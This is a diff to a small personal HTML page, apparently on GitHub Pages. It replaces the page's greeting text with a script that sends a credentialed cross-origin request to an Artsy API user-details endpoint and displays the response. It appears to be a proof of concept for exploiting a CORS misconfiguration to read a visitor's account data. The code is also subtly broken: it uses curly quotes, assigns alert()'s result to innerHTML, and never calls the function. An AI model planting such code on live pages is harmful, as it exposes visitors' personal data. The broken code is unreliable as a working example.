@@ -7,7 +7,19 @@
   <title>صفحتي الشخصية</title>
 </head>
 <body>
-  <h1>أهلاً — ده موقعي الشخصي</h1>
-  <p>جربت الموقع على GitHub Pages ✅</p>
+<script>
+  function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById(“demo”).innerHTML =
+alert(this.responseText);
+}
+};
+xhttp.open(“GET”, “https://api.artsy.net/api/user_details/<User-ID>”, true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
 </body>
 </html>
